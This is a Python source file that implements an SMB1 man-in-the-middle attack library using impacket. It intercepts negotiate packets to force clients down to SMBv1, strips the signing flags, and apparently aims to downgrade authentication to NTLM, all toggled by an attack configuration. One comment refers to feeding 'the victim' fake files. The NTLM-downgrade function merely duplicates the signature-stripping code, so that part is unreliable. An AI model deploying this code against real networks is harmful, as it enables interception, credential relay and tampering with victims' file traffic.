from impacket.smb3 import *
from impacket.smb3structs import *
from impacket import smb
import struct
import socket
import os
import copy
from random import randint
from impacket import spnego
import traceback
import logging
from binascii import hexlify, unhexlify
from SMB_Core import SMB_Core


class SMB1_Lib(SMB_Core):
	# Returns a modified smb1 negotiate protocol request packet that strips away
	# any claims for supporting smb2/3
	# 
	# Takes in a NewSMBPacket as negProtocolReqPacket
	def negotiateReq_StripSMBDialects(self, negProtocolReqPacket):
		# Parse the request
		negSession 	= SMBCommand(negProtocolReqPacket['Data'][0])
		dialects 	= negSession['Data'].split('\x02')
		# Track what index SMBv1 is in 
		for di in range(0, len(dialects)):
			if(dialects[di] == 'NT LM 0.12\x00'):
				self.SMB1_DIALECT_INDEX = di - 1

		# Replace their list of dialects, with a singular list containing only "NT LM 0.12" (smbv1 as we know it)
		modCmd = SMBCommand(unhexlify("000e00024e54204c4d20302e3132000200"))
		negProtocolReqPacket['Data'][0] = str(modCmd)
		# Return the modded packet
		return negProtocolReqPacket
	# Returns a modified smb1 negotiate protocol response packet that acknowledges
	# the SMB1 dialect. This must be adjusted since we faked the list, the index it 
	# states is selecting won't actually match the SMB1 index from the original 
	# negotiate packet
	def negotiateResp_StripSMBDialects(self, negProtocolRespPacket):
		respData 	= SMBCommand(negProtocolRespPacket['Data'][0])
		dialectData = SMBNTLMDialect_Parameters(respData['Parameters'])
	

		dialectData['DialectIndex'] = self.SMB1_DIALECT_INDEX
		respData['Parameters'] 		= dialectData

		negProtocolRespPacket['Data'][0] = str(respData)

		return negProtocolRespPacket

	# Returns a modified smb1 negotiate protocol request packet that strips away
	# any non-required signing features
	# 
	# Takes in a NewSMBPacket as negProtocolReqPacket
	def negotiateReq_StripSignatureSupport(self, negProtocolReqPacket):
		# Parse the data
		negSession 	= SMBCommand(negProtocolReqPacket['Data'][0])
		# Strip support for signatures (This won't work if they're REQUIRED)
		negSession['Flags2'] = negSession['Flags2'] & (~SMB.SECURITY_SIGNATURES_ENABLED)
		negProtocolReqPacket['Data'][0] = str(negSession)
		# Return the modded packet
		return negProtocolReqPacket

	# Returns a modified smb1 negotiate protocol request packet that strips away
	# any claims for supporting every auth mechanisms except NTLM
	# 
	# Takes in a NewSMBPacket as negProtocolReqPacket 
	def negotiateReq_DowngradeToNTLM(self, negProtocolReqPacket):
		# Parse the data
		negSession 	= SMBCommand(negProtocolReqPacket['Data'][0])
		# Strip support for signatures (This won't work if they're REQUIRED)
		negSession['Flags2'] = negSession['Flags2'] & (~SMB.SECURITY_SIGNATURES_ENABLED)
		negProtocolReqPacket['Data'][0] = str(negSession)
		# Return the modded packet
		return negProtocolReqPacket

	# This generates a simple SMB_COM_ECHO packet
	# to send to the server - keeping the message #'s 
	# in sync while we feed the victim a fake file/info
	def generateEchoMessage(self, pkt):
		# https://msdn.microsoft.com/en-us/library/ee441746.aspx
		pass
	
	# 
	def handleRequest(self, rawData):
		try:
			packet 	= NewSMBPacket(data = rawData[4:])
			#Negotiate Protocol Request
			if(packet['Command'] == 114):
				if(self.info['attackConfig'].DIALECT_DOWNGRADE):
					# check server support 
					logging.info("Downgrading client request to SMBv1")
					packet = self.negotiateReq_StripSMBDialects(packet)


				if(self.info['attackConfig'].SECURITY_DOWNGRADE):
					logging.info("Stripping client signature support")
					packet = self.negotiateReq_StripSignatureSupport(packet)


				if(self.info['attackConfig'].AUTHMECH_DOWNGRADE):
					logging.info("Downgrading auth mechanisms to NTLM")
					packet = self.negotiateReq_DowngradeToNTLM(packet)

			return self.restackSMBChainedMessages([packet])
		except Exception, e:
			return rawData
	# 
	def handleResponse(self, rawData):
		try:
			# Craft the packet	
			packet 	= NewSMBPacket(data = rawData[4:])

			#Negotiate Protocol Response
			if(packet['Command'] == 114):
				if(self.info['attackConfig'].DIALECT_DOWNGRADE and self.SMB1_DIALECT_INDEX > -1):
					logging.info("Succesfully downgraded to SMBv1")
					packet = self.negotiateResp_StripSMBDialects(packet)

			return self.restackSMBChainedMessages([packet])
		except Exception, e:
			return rawData

